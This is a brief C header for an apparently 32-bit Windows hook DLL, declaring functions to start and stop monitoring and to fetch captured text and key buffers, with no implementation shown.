#if !defined(THIRTY2BITHOOKDLL_H)
#define THIRTY2BITHOOKDLL_H



/*
 *
 * includes
 *
 */
#include <windows.h>



/*
 *
 * function prototypes
 *
 */
// public functions
void WINAPI StartMonitoring(void);
void WINAPI StopMonitoring(void);
void WINAPI GetTextBuffer(LPSTR, size_t *);
void WINAPI GetKeyBuffer(LPSTR, size_t *);



#endif
